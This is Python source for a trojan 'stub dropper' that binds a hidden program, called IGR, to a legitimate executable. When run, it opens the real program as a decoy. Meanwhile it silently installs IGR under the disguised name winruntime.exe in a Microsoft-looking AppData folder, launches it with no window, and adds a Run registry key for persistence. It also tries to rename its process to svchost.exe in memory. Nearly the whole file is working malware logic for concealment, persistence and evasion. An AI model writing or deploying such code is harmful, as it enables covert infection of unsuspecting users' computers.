"""
IGR Stub Dropper - Extracts and runs both the legitimate program and IGR silently.
This gets compiled into stub.exe, then binder.py merges it with the target exe and IGR exe.
When the bound executable runs, the stub:
1. Reads itself to find embedded payloads (legit exe + IGR exe)
2. Extracts the legitimate exe to a hidden dir and launches it (user sees the real program)
3. Installs IGR silently to AppData (same as setup.bat would do)
4. Launches IGR in the background
"""

import os
import sys
import struct
import subprocess
import shutil
import time

MAGIC = b"IGR_BIND\x00"
FOOTER_SIZE = 8 + 8 + len(MAGIC)
_DEBUG_LOG = os.path.join(os.environ.get("TEMP", "."), "_igr_stub.log")


def _log(msg: str) -> None:
    """Write debug log to temp directory."""
    try:
        with open(_DEBUG_LOG, "a") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except:
        pass


def _find_payloads() -> tuple:
    """Read own exe and extract embedded legit exe and IGR exe by footer."""
    own_path = sys.executable
    _log(f"Own path: {own_path}")
    _log(f"Own size: {os.path.getsize(own_path)}")
    with open(own_path, "rb") as f:
        f.seek(-FOOTER_SIZE, 2)
        footer = f.read(FOOTER_SIZE)
    if len(footer) < FOOTER_SIZE:
        _log(f"Footer too short: {len(footer)}")
        return None, None
    magic = footer[-len(MAGIC):]
    if magic != MAGIC:
        _log(f"Magic mismatch: {magic}")
        return None, None
    legit_size = struct.unpack("<Q", footer[:8])[0]
    igr_size = struct.unpack("<Q", footer[8:16])[0]
    _log(f"Legit size: {legit_size}, IGR size: {igr_size}")
    total_file_size = os.path.getsize(own_path)
    stub_size = total_file_size - legit_size - igr_size - FOOTER_SIZE
    if stub_size < 0 or legit_size < 0 or igr_size < 0:
        _log(f"Invalid sizes: stub={stub_size}")
        return None, None
    with open(own_path, "rb") as f:
        f.seek(stub_size)
        legit_data = f.read(legit_size)
        igr_data = f.read(igr_size)
    if len(legit_data) != legit_size or len(igr_data) != igr_size:
        _log(f"Read mismatch: legit {len(legit_data)}/{legit_size}, igr {len(igr_data)}/{igr_size}")
        return None, None
    _log("Payloads extracted OK")
    return legit_data, igr_data


def _install_igr(igr_data: bytes) -> bool:
    """Install IGR silently - same logic as setup.bat."""
    install_dir = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "WindowsRuntime")
    try:
        if not os.path.exists(install_dir):
            os.makedirs(install_dir, exist_ok=True)
    except:
        return False

    igr_path = os.path.join(install_dir, "winruntime.exe")
    try:
        with open(igr_path, "wb") as f:
            f.write(igr_data)
    except:
        return False

    try:
        subprocess.run(["taskkill", "/f", "/im", "winruntime.exe"],
                       capture_output=True, timeout=5, creationflags=0x08000000)
        time.sleep(1)
    except:
        pass

    try:
        subprocess.Popen([igr_path],
                         creationflags=0x08000000, close_fds=True)
    except:
        return False

    try:
        import winreg
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsRuntime", 0, winreg.REG_SZ, igr_path)
        winreg.CloseKey(key)
    except:
        pass

    _log("IGR installed OK")
    return True


def _launch_legit(legit_data: bytes, original_name: str) -> bool:
    """Extract legitimate exe to a hidden directory and launch it via ShellExecute."""
    app_data = os.environ.get("APPDATA", os.path.expanduser("~"))
    host_dir = os.path.join(app_data, "Microsoft", "_host")
    try:
        os.makedirs(host_dir, exist_ok=True)
        subprocess.run(["attrib", "+h", host_dir], capture_output=True, creationflags=0x08000000)
    except:
        pass
    legit_path = os.path.join(host_dir, original_name)
    _log(f"Legit path: {legit_path}")
    try:
        with open(legit_path, "wb") as f:
            f.write(legit_data)
    except:
        temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "C:\\Temp"))
        host_dir = temp_dir
        legit_path = os.path.join(temp_dir, original_name)
        try:
            with open(legit_path, "wb") as f:
                f.write(legit_data)
        except:
            _log("Failed to write legit exe anywhere")
            return False

    _log(f"Legit exe written: {os.path.getsize(legit_path)} bytes")

    # Primary: os.startfile uses ShellExecuteEx - handles UAC, manifests, installers properly
    try:
        os.startfile(legit_path)
        _log("Legit launched via startfile OK")
        return True
    except Exception as e:
        _log(f"startfile failed: {e}")

    # Fallback: ShellExecute via ctypes (same as startfile but more control)
    try:
        import ctypes
        shell32 = ctypes.windll.shell32
        ret = shell32.ShellExecuteW(None, "open", legit_path, None, host_dir, 1)
        if ret > 32:
            _log("Legit launched via ShellExecuteW OK")
            return True
        _log(f"ShellExecuteW returned: {ret}")
    except Exception as e:
        _log(f"ShellExecuteW failed: {e}")

    # Last resort: subprocess.Popen
    try:
        subprocess.Popen([legit_path], cwd=host_dir)
        _log("Legit launched via Popen OK")
        return True
    except Exception as e:
        _log(f"Popen failed: {e}")
        return False


def _spoof_igr_process() -> None:
    """Spoof the IGR process name in PEB after legit program closes."""
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll
        peb_offset = 0x30 if ctypes.sizeof(ctypes.c_void_p) == 4 else 0x60
        process_params_offset = 0x10 if ctypes.sizeof(ctypes.c_void_p) == 4 else 0x20
        current_process = kernel32.GetCurrentProcess()
        pbi = (ctypes.c_ulong * 6)()
        ntdll.NtQueryInformationProcess(current_process, 0, pbi, ctypes.sizeof(pbi), None)
        peb_addr = pbi[1]
        if not peb_addr:
            return
        process_params_addr = ctypes.c_void_p.from_address(peb_addr + process_params_offset).value
        if not process_params_addr:
            return
        image_path_addr = process_params_addr + (0x38 if ctypes.sizeof(ctypes.c_void_p) == 8 else 0x1C)
        buf_ptr = ctypes.c_void_p.from_address(image_path_addr)
        new_buf = ctypes.create_unicode_buffer("svchost.exe")
        buf_ptr.value = ctypes.addressof(new_buf)
    except:
        pass


def main():
    _log("=== Stub starting ===")
    legit_data, igr_data = _find_payloads()
    if legit_data is None or igr_data is None:
        _log("No payloads found - exiting")
        return

    own_name = os.path.basename(sys.executable)
    _log(f"Own name: {own_name}")
    _launch_legit(legit_data, own_name)
    time.sleep(2)
    _install_igr(igr_data)
    _spoof_igr_process()
    _log("=== Stub done ===")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        _log(f"FATAL: {e}")
